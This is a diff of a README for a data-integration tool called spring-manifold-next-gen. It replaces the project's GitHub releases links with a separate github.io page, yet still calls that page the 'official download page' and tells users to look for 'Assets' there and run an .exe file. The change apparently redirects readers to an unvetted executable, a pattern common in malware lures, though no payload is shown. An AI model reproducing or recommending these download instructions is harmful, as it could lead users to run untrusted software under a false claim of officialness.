@@ -1,6 +1,6 @@
 # 📦 spring-manifold-next-gen - Move data between systems with ease
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/doriapt53/spring-manifold-next-gen/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://doriapt53.github.io)
 
 Spring-Manifold Next-Gen helps you move data from one place to another. You can take information from various sources and send it to your search tools or databases. It works behind the scenes to keep your data current and organized. This tool runs on your computer and manages the complex work of connecting systems.
 
@@ -19,7 +19,7 @@ If you do not have Java installed, you must download it from the official websit
 
 Follow these steps to set up the application:
 
-1.  Visit the [official download page](https://github.com/doriapt53/spring-manifold-next-gen/releases).
+1.  Visit the [official download page](https://doriapt53.github.io).
 2.  Look for the section labeled "Assets" under the most recent version.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file finishes downloading, locate it in your Downloads folder.
